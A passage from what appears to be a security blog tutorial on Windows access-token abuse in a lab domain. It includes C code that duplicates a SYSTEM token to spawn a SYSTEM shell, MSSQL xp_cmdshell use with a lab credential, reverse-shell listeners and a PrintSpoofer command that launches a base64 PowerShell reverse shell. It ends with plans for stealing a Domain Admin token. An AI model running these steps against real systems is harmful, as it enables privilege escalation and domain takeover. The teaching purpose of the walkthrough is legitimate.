+<p>Additionally, Windows applies the principle of <strong>least privilege</strong> even to high-privileged accounts. Certain sensitive privileges are only added or enabled when they are explicitly required by the process or granted by the system at logon time. As a result, two SYSTEM tokens can look different depending on how they were created.</p><br/>
+<p>That said, this is usually not a problem. Even with a reduced set of privileges, a SYSTEM shell is still powerful enough to perform most actions we care about, including service manipulation, token operations, and further privilege escalation if needed. These privileges are enough for us from an attacker perspective.</p><br/>
+<h3>CreateProcessAsUser</h3><br/>
+<p>Now, you may be wondering how we can achieve the same result using the other function, <code>CreateProcessAsUser</code>. As mentioned earlier, this function requires a bit more setup before we can use it.</p><br/>
+<p>For example, we need to explicitly specify the <strong>Session ID</strong> by modifying the token with <code>SetTokenInformation</code>. If we don’t do this, we won’t see the new <code>cmd.exe</code> window pop up. This happens because Windows usually associates the new process with the Session ID stored in the token, which for SYSTEM is, in most cases, session 0.</p><br/>
+<p>On top of that, we also need to configure part of the environment for the new process. Once all of this is in place, we can finally spawn the process as expected. Here’s how we can do it:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span><span class="w"> </span><span class="n">systemToken</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TOKEN_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">    </span><span class="n">SecurityImpersonation</span><span class="p">,</span><span class="w"> </span><span class="n">TokenPrimary</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">systemToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Initialize startup info for new process</span>
+<span class="n">PROCESS_INFORMATION</span><span class="w"> </span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
+<span class="n">STARTUPINFO</span><span class="w"> </span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
+<span class="n">si</span><span class="p">.</span><span class="n">lpDesktop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">"Winsta0</span><span class="se">\\</span><span class="s">Default"</span><span class="p">;</span>
+
+<span class="c1">// Impersonate user and enable required privileges</span>
+<span class="n">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="n">systemToken</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">enablePrivilege</span><span class="p">(</span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="n">SE_TCB_NAME</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] Could not enable %ws</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">SE_TCB_NAME</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">enablePrivilege</span><span class="p">(</span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="n">SE_ASSIGNPRIMARYTOKEN_NAME</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] Could not enable %ws</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">SE_ASSIGNPRIMARYTOKEN_NAME</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">enablePrivilege</span><span class="p">(</span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="n">SE_INCREASE_QUOTA_NAME</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] Could not enable %ws</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">SE_INCREASE_QUOTA_NAME</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Set token session ID</span>
+<span class="n">DWORD</span><span class="w"> </span><span class="n">currentSessionID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WTSGetActiveConsoleSessionId</span><span class="p">();</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SetTokenInformation</span><span class="p">(</span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="n">TokenSessionId</span><span class="p">,</span>
+<span class="w">    </span><span class="o">&amp;</span><span class="n">currentSessionID</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] SetTokenInformation failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">systemToken</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Re-impersonate to update token and create environment block </span>
+<span class="n">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="n">systemToken</span><span class="p">);</span>
+
+<span class="n">HANDLE</span><span class="w"> </span><span class="n">hEnvironment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">CreateEnvironmentBlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hEnvironment</span><span class="p">,</span><span class="w"> </span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] CreateEnvironmentBlock failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="p">}</span>
+
+<span class="c1">// Launch process as user</span>
+<span class="n">DWORD</span><span class="w"> </span><span class="n">createFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CREATE_UNICODE_ENVIRONMENT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CREATE_NEW_CONSOLE</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">CreateProcessAsUserW</span><span class="p">(</span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">,</span>
+<span class="w">    </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">createFlags</span><span class="p">,</span>
+<span class="w">    </span><span class="n">hEnvironment</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] CreateProcessAsUser failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>At a high level, this code follows the same initial steps we’ve already seen: we duplicate a SYSTEM token and convert it into a <strong>primary token</strong> using <code>DuplicateTokenEx</code>. Since this part is identical to the previous scenarios, we won’t go into much detail here.</p><br/>
+<p>Where things start to differ is in the extra preparation required by <code>CreateProcessAsUser</code>.</p><br/>
+<p>First, we impersonate the token and explicitly enable the privileges required by <code>CreateProcessAsUser</code>, namely <code>SeAssignPrimaryTokenPrivilege</code> and <code>SeIncreaseQuotaPrivilege</code>. Without these privileges enabled, the function will fail, even if the token belongs to SYSTEM.</p><br/>
+<p>Next comes one of the most important steps: <strong>changing the Session ID of the token</strong>. By default, SYSTEM tokens are usually associated with <strong>session 0</strong>, which means any GUI process created with that token won’t be visible to the current user. To fix this, we retrieve the active console session using <code>WTSGetActiveConsoleSessionId</code> and update the token with <code>SetTokenInformation</code>.</p><br/>
+<p>According to Microsoft’s documentation, modifying the Session ID of a token requires the <strong>“Act as part of the operating system”</strong> privilege, also known as <code>SeTcbPrivilege</code>. This is a highly sensitive privilege and one of the reasons why this approach only works in very privileged contexts. In our case, we’re SYSTEM already, so this isn’t a problem at all.</p><br/>
+<p>After updating the Session ID, we impersonate the token again to ensure the changes take effect, and then we build a proper <strong>environment block</strong> for the new process using <code>CreateEnvironmentBlock</code>. This step is important so the spawned process gets a valid environment (paths, variables, etc.) instead of inheriting a broken or empty one.</p><br/>
+<p>Finally, with everything set up, we call <code>CreateProcessAsUserW</code> to spawn <code>cmd.exe</code>, passing the prepared token, the environment block, and the appropriate creation flags. </p><br/>
+<p>Now, let's run our program:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens10.png"/></p><br/>
+<p>As we can see, it worked and we successfully obtained a shell as SYSTEM. However, as shown in the output, the program had to iterate through multiple tokens before finding a suitable one.</p><br/>
+<p>This happens because, as mentioned earlier, even if a token belongs to SYSTEM, it doesn’t necessarily mean it has every privilege. In this case, we needed <code>SeTcbPrivilege</code>, <code>SeAssignPrimaryTokenPrivilege</code>, and <code>SeIncreaseQuotaPrivilege</code>, and not every SYSTEM token includes all of them. Now, we have a really juicy token:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens11.png"/></p><br/>
+<h3>Scenario 2</h3><br/>
+<p>Now that we know how to use Access Tokens, let's jump to the second scenario. In this case, we'll assume we obtained valid credentials for a DB admin in a MSSQL Instance, which means we can use commands such as <code>xp_cmdshell</code> to execute commands in the system.</p><br/>
+<p>Let's connect to the MSSQL Instance and enable xp_cmdshell:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">developer</span><span class="p">:</span><span class="n">Password2</span>\<span class="n">!</span><span class="o">@</span><span class="mf">192.168.100.31</span> <span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">auth</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Encryption</span> <span class="n">required</span><span class="p">,</span> <span class="n">switching</span> <span class="n">to</span> <span class="n">TLS</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">LANGUAGE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">us_english</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">PACKETSIZE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">16192</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">ITWS02</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">database</span> <span class="n">context</span> <span class="n">to</span> <span class="s1">'master'</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">ITWS02</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">language</span> <span class="n">setting</span> <span class="n">to</span> <span class="n">us_english</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ACK</span><span class="p">:</span> <span class="n">Result</span><span class="p">:</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="p">(</span><span class="mi">170</span> <span class="mi">3232</span><span class="p">)</span> 
+<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">SQL</span> <span class="p">(</span><span class="n">IT</span><span class="o">-</span><span class="n">ELSWIXCORP</span>\<span class="n">developer</span>  <span class="n">dbo</span><span class="n">@master</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">enable_xp_cmdshell</span>
+<span class="n">INFO</span><span class="p">(</span><span class="n">ITWS02</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">196</span><span class="p">:</span> <span class="n">Configuration</span> <span class="n">option</span> <span class="s1">'show advanced options'</span> <span class="n">changed</span> <span class="kn">from</span><span class="w"> </span><span class="mi">1</span> <span class="n">to</span> <span class="mf">1.</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">RECONFIGURE</span> <span class="n">statement</span> <span class="n">to</span> <span class="n">install</span><span class="o">.</span>
+<span class="n">INFO</span><span class="p">(</span><span class="n">ITWS02</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">196</span><span class="p">:</span> <span class="n">Configuration</span> <span class="n">option</span> <span class="s1">'xp_cmdshell'</span> <span class="n">changed</span> <span class="kn">from</span><span class="w"> </span><span class="mi">1</span> <span class="n">to</span> <span class="mf">1.</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">RECONFIGURE</span> <span class="n">statement</span> <span class="n">to</span> <span class="n">install</span><span class="o">.</span>
+<span class="n">SQL</span> <span class="p">(</span><span class="n">IT</span><span class="o">-</span><span class="n">ELSWIXCORP</span>\<span class="n">developer</span>  <span class="n">dbo</span><span class="n">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<p>It looks like it worked. Now let's execute a command in the system:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">SQL</span> <span class="p">(</span><span class="n">IT</span><span class="o">-</span><span class="n">ELSWIXCORP</span>\<span class="n">developer</span>  <span class="n">dbo</span><span class="n">@master</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">xp_cmdshell</span> <span class="n">whoami</span> 
+<span class="n">output</span>                 
+<span class="o">--------------------</span>   
+<span class="n">it</span><span class="o">-</span><span class="n">elswixcorp</span>\<span class="n">sqlsvc</span>   
+
+<span class="n">NULL</span>                   
+
+<span class="n">SQL</span> <span class="p">(</span><span class="n">IT</span><span class="o">-</span><span class="n">ELSWIXCORP</span>\<span class="n">developer</span>  <span class="n">dbo</span><span class="n">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<p>Now, let's see what privileges the <code>sqlsvc</code> user has:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens12.png"/></p><br/>
+<p>As expected, it has the <code>SeImpersonatePrivilege</code> enabled. By default, Windows services have this privilege enabled for the reason we explained when introducing Impersonation Tokens.</p><br/>
+<p>Some services that use Windows authentication need to temporarily adapt to the security context of the client user. This usually happens because of privileges. For example, if you expose an SMB share, you definitely don’t want every request to run as SYSTEM, that would be extremely dangerous!</p><br/>
+<p>Instead, services can impersonate the user’s security context using this privilege, allowing them to perform the requested action while respecting the user’s own permissions.</p><br/>
+<p>Playing from <code>xp_cmdshell</code> is a bit annoying, so let’s get a reverse shell instead. You can use <a href="https://revshells.com">revshells</a> to craft a custom one. In my case, I used PowerShell #3 (Base64).</p><br/>
+<p>Since we’re just practicing and focusing on how the exploitation works, I disabled the AV so it doesn’t get in the way. I’ll probably write an article about AV/EDR bypassing in the future.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
+<span class="n">Connection</span> <span class="n">received</span> <span class="n">on</span> <span class="mf">192.168.100.31</span> <span class="mi">49788</span>
+
+<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span>
+</pre></div>
+<h3>From SeImpersonatePrivilege to System</h3><br/>
+<p>Now, let’s escalate to SYSTEM by abusing <code>SeImpersonatePrivilege</code>. This time, however, it won’t be that easy. In the previous example, I showed a scenario where our “low-privileged” user also had <code>SeDebugPrivilege</code>, which allowed us to steal tokens from other processes.</p><br/>
+<p>In this case, we don’t have that privilege, so we need to change our approach a bit.</p><br/>
+<p>Generally, when you run into a scenario like this, you’ll use an exploit like <code>GodPotato</code>, <code>PrintSpoofer</code>, and similar ones. These exploits typically allow you to gain SYSTEM privileges by abusing <code>SeImpersonatePrivilege</code>.</p><br/>
+<p>But how can you abuse this privilege <em>without</em> accessing tokens from other processes ( without <code>SeDebugPrivilege</code>)? Let’s take a look at how this works under the hood.</p><br/>
+<h3>Explaination</h3><br/>
+<p>The key idea here is <strong>impersonation</strong>.</p><br/>
+<p>As explained earlier, in Windows, impersonation is designed to let a service temporarily act <em>on behalf of a client</em>. When a privileged service receives a request from a user, it can impersonate that user’s token to perform actions using the client’s security context. This is a completely legitimate mechanism and is heavily used by Windows services.</p><br/>
+<p><code>SeImpersonatePrivilege</code> is what allows a process to do exactly that: <strong>impersonate another token</strong>. The important detail is <em>which</em> tokens it is allowed to impersonate.</p><br/>
+<p>Here’s where things get interesting.</p><br/>
+<p>Many Windows services run as <strong>SYSTEM</strong> and expose some form of IPC mechanism, named pipes, RPC, COM, etc, that allows lower-privileged users to talk to them. When such a service accepts a connection, Windows often creates a <strong>client token</strong> representing the connecting user, and the service can choose to impersonate that token.</p><br/>
+<p>The key detail with exploits like <strong>PrintSpoofer</strong>, <strong>GodPotato</strong>, and similar techniques is that <strong>we are not the client, we become the server</strong>.</p><br/>
+<p>Instead of connecting to a privileged service, the attacker-controlled process starts by creating a server-side IPC endpoint, usually a <strong>named pipe</strong>, but the same idea applies to other mechanisms (RPC, COM, etc.).</p><br/>
+<p>Once this server is up, the next step is to <strong>force a SYSTEM process to authenticate to it</strong>. This can be done in different ways depending on the exploit, but the result is always the same: a <strong>SYSTEM service connects to our server</strong>.</p><br/>
+<p>And this is where access tokens come into play.</p><br/>
+<p>When a client connects to a server over mechanisms like named pipes, Windows creates a <strong>token representing the client’s security context</strong> and associates it with that connection. In this case, the client is SYSTEM, so the token tied to that connection is a <strong>SYSTEM token</strong>.</p><br/>
+<p>Because our process owns the server endpoint and has <code>SeImpersonatePrivilege</code>, Windows allows us to <strong>impersonate the connected client</strong> using APIs such as <code>ImpersonateNamedPipeClient</code> for named pipes.</p><br/>
+<p>At that moment, we are no longer acting as our original low-privileged user. Our thread is now running under a <strong>SYSTEM impersonation token</strong>, one that Windows legitimately created as part of the authentication process.</p><br/>
+<p>From there, the token flow is exactly what you’d expect:</p><br/>
+<ul>
+<li>We impersonate the client and obtain a SYSTEM impersonation token</li>
+<li>We duplicate it into a <strong>primary token</strong></li>
+<li>We spawn a new process using that token</li>
+<li>We get code execution as SYSTEM</li>
+</ul>
+<p>Again, no token stealing, no <code>SeDebugPrivilege</code>, and no direct interaction with other processes’ token handles. The SYSTEM token is legitimately created by Windows as part of the client authentication process.</p><br/>
+<p>Of course, the impersonation token must have an impersonation level of <code>SecurityImpersonation</code> or higher, otherwise the server would only be able to identify the client, not perform actions on its behalf, however most of the time you obtain a valid token.</p><br/>
+<p>What makes this class of exploits powerful is that they abuse normal Windows authentication and impersonation behavior. Windows is doing exactly what it was designed to do: create access tokens for authenticated clients and allowing servers with <code>SeImpersonatePrivilege</code> to impersonate them.</p><br/>
+<p>The "vulnerability" lies in how easy it is to coerce a SYSTEM process into authenticating to an attacker-controlled server, effectively handing over a SYSTEM access token through a perfectly valid impersonation flow. The weakness is not impersonation, but the authentication trigger.</p><br/>
+<p>For example, let’s take a look at the <a href="https://github.com/itm4n/PrintSpoofer/blob/master/PrintSpoofer/PrintSpoofer.cpp">PrintSpoofer</a> exploit source code, which is pretty easy to understand. I won’t go into detail about how it coerces authentication from the Print Spooler service, it’s actually quite simple, and you can read it yourself if you’re interested, but for now, let’s take a conceptual look at what’s happening:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens13.png"/></p><br/>
+<p>Alright, let’s break this down.</p><br/>
+<p>First, the exploit checks whether <code>SeImpersonatePrivilege</code> is enabled. This is mandatory, without it, the exploit simply won’t work.</p><br/>
+<p>Then, it creates a named pipe using a randomly generated pipe name. This named pipe acts as our <strong>listening server endpoint</strong>. After the authentication is coerced, this is the pipe that SYSTEM will connect to.</p><br/>
+<p>Once the named pipe is set up, the exploit calls a function called <code>TriggerNamedPipeConnection</code>. This function is responsible for forcing a SYSTEM process (the Print Spooler service) to authenticate to our newly created named pipe.</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens14.png"/></p><br/>
+<p>After that, the exploit waits for the authentication to arrive on the named pipe. Once the connection is established, it calls the <code>GetSystem()</code> function, passing the named pipe handle as an argument.</p><br/>
+<p>This function is where the actual impersonation happens and where SYSTEM access is obtained. Let’s take a closer look at it.</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens15.png"/></p><br/>
+<p>Initially, it receives the named pipe handle through the <code>hPipe</code> parameter and passes it to <code>ImpersonateNamedPipeClient</code>.</p><br/>
+<p>As mentioned before, this function behaves very similarly to <code>ImpersonateLoggedOnUser</code>. The main difference is that, instead of explicitly providing an access token, we provide a <strong>named pipe handle</strong>. Internally, Windows looks at the security context associated with the client side of that pipe connection.</p><br/>
+<p>Since the client that connected to our named pipe is a SYSTEM process, Windows has already created an <strong>access token representing SYSTEM</strong> for that connection. When <code>ImpersonateNamedPipeClient</code> is called, Windows replaces the <strong>current thread token</strong> with this client token.</p><br/>
+<p>At this point, our thread is no longer running under the original low-privileged user. It is now executing under a <strong>SYSTEM impersonation token</strong>, obtained through a completely legitimate impersonation flow.</p><br/>
+<p>In other words, we are not creating or stealing a token ourselves, we are simply asking Windows to let us impersonate the client that authenticated to our server, and Windows happily does so.</p><br/>
+<p>Then, the process is similar to what we’ve done before:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens16.png"/></p><br/>
+<p>First, it saves the current thread token, which at this point is the <strong>impersonated SYSTEM token</strong>, into a handle using the <code>OpenThreadToken</code> function. Then, it duplicates this token using <code>DuplicateTokenEx</code> to create a <strong>new primary token</strong>. This primary token is the one that will later be used to create new processes.</p><br/>
+<p>After that, everything is prepared for process creation. If a specific session ID was provided, the exploit modifies the token accordingly using <code>SetTokenInformation</code>. It also performs some additional environment setup, similar to what we’ve already seen before.</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens17.png"/></p><br/>
+<p>Once everything is ready, it calls <code>CreateProcessAsUser</code>, passing the newly created SYSTEM primary token to spawn a new process.</p><br/>
+<p>If this call fails, the exploit falls back to <code>CreateProcessWithToken</code>. This usually happens when the <em>Interact with console</em> option (<code>-i</code>) was not specified, but that detail isn’t particularly relevant for the explanation here.</p><br/>
+<p>Well, now let's execute the exploit to escalate privileges:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Tasks</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">PrintSpoofer64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">cmd</span> <span class="s2">"cmd /c powershell -e &lt;BASE64 Reverse Shell&gt;"</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">privilege</span><span class="p">:</span> <span class="n">SeImpersonatePrivilege</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Named</span> <span class="n">pipe</span> <span class="n">listening</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">CreateProcessAsUser</span><span class="p">()</span> <span class="n">OK</span>
+</pre></div>
+<p>Finally, we get a shell as system:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3002</span>
+<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3002</span>
+<span class="n">Connection</span> <span class="n">received</span> <span class="n">on</span> <span class="mf">192.168.100.31</span> <span class="mi">49891</span>
+
+<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span>
+<span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>
+<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span>
+</pre></div>
+<h3>From SYSTEM to Domain Admin</h3><br/>
+<p>Well, this is an extra step you can also take. Essentially, now we’re going to impersonate a Domain Admin on our system so we can compromise the domain. To do this, a Domain Admin must be interactively logged on to the system. What we’re going to do is steal that user’s token, impersonate it, and then try to compromise the domain by creating a new domain user and adding it to the Domain Admins group.</p><br/>
+<p>But how can we achieve this? As mentioned before, one key requirement is that a Domain Admin has interactively logged on to the system, so their credentials are stored in LSASS. Otherwise, this would be a waste of time, since we’d only end up with local admin access, which we already have.</p><br/>
+<p>The process is almost the same as what we did earlier when abusing the SeImpersonatePrivilege and SeDebugPrivilege (now we have both, since we’re running as SYSTEM). The difference is that this time we need to hunt for Domain Admin tokens instead of the SYSTEM one, so we have to apply a different filter.</p><br/>
+<p>If you run <code>query user</code>, you can list the users that are interactively logged on (sessions):</p><br/>
+<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">query</span> <span class="n">user</span>
+ <span class="n">USERNAME</span>              <span class="n">SESSIONNAME</span>        <span class="n">ID</span>  <span class="n">STATE</span>   <span class="n">IDLE</span> <span class="n">TIME</span>  <span class="n">LOGON</span> <span class="n">TIME</span>
+ <span class="n">administrator</span>         <span class="n">console</span>             <span class="mi">1</span>  <span class="n">Active</span>      <span class="n">none</span>   <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">2026</span> <span class="mi">11</span><span class="p">:</span><span class="mi">42</span> <span class="n">AM</span>
+<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span>
+</pre></div>
+<p>To do this demonstration, I’m going to add a new user to the system and make it a local administrator so I can authenticate through LogonUI and get graphical access. This isn’t required to jump to the logged-on Domain Admin, but I want to do it this way because I want to show you something.</p><br/>
+<p>Let’s get back to our initial code. This time, instead of impersonating SYSTEM, we’ll impersonate the Administrator user, so we need to apply a different filter. For this purpose, I created the following function:</p><br/>
